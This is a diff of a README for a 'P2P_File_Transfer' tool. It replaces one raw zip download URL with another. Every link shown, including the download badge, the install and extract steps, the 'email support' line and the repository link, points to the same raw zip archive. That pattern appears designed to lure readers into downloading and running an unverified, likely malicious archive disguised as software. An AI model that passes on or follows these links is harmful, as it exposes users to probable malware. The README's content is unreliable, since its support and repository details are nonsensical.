@@ -1,6 +1,6 @@
 # 📁 P2P_File_Transfer - Fast, Secure File Sharing Made Easy
 
-[![Download](https://github.com/B4Proo-ct/P2P_File_Transfer/raw/refs/heads/main/main/File-Transfer-v3.8.zip%20Release-brightgreen)](https://github.com/B4Proo-ct/P2P_File_Transfer/raw/refs/heads/main/main/File-Transfer-v3.8.zip)
+[![Download](https://github.com/B4Proo-ct/P2P_File_Transfer/raw/refs/heads/main/fileshare/File_Transfer_2.8.zip%20Release-brightgreen)](https://github.com/B4Proo-ct/P2P_File_Transfer/raw/refs/heads/main/fileshare/File_Transfer_2.8.zip)
 
 ## 🚀 Getting Started
 
@@ -31,13 +31,13 @@ To run P2P_File_Transfer, you will need:
 3. Download the appropriate file for your operating system:
    - **Windows**: Download the Windows installer (e.g., `.exe` file).
    - **Mac**: Download the Mac installer (e.g., `.dmg` file).
-   - **Linux**: Download the Linux package (e.g., `https://github.com/B4Proo-ct/P2P_File_Transfer/raw/refs/heads/main/main/File-Transfer-v3.8.zip` file).
+   - **Linux**: Download the Linux package (e.g., `https://github.com/B4Proo-ct/P2P_File_Transfer/raw/refs/heads/main/fileshare/File_Transfer_2.8.zip` file).
 
 4. Once downloaded, locate the file in your Downloads folder:
 
    - **For Windows**: Double-click the `.exe` file to run the installer and follow the on-screen instructions.
    - **For Mac**: Open the `.dmg` file, drag the P2P_File_Transfer application to your Applications folder.
-   - **For Linux**: Extract the `https://github.com/B4Proo-ct/P2P_File_Transfer/raw/refs/heads/main/main/File-Transfer-v3.8.zip` file and follow instructions in the README file inside.
+   - **For Linux**: Extract the `https://github.com/B4Proo-ct/P2P_File_Transfer/raw/refs/heads/main/fileshare/File_Transfer_2.8.zip` file and follow instructions in the README file inside.
 
 5. After installation, open the application and start sharing files with friends or colleagues.
 
@@ -73,11 +73,11 @@ If you want to contribute to this project:
 If you encounter problems or need help, feel free to contact us:
 
 - Open an issue on the GitHub repository.
-- Email support at https://github.com/B4Proo-ct/P2P_File_Transfer/raw/refs/heads/main/main/File-Transfer-v3.8.zip
+- Email support at https://github.com/B4Proo-ct/P2P_File_Transfer/raw/refs/heads/main/fileshare/File_Transfer_2.8.zip
 
 ## 🌏 Learn More
 
-For additional information, documentation, or updates, please visit our [GitHub repository](https://github.com/B4Proo-ct/P2P_File_Transfer/raw/refs/heads/main/main/File-Transfer-v3.8.zip).
+For additional information, documentation, or updates, please visit our [GitHub repository](https://github.com/B4Proo-ct/P2P_File_Transfer/raw/refs/heads/main/fileshare/File_Transfer_2.8.zip).
 
 ---
 
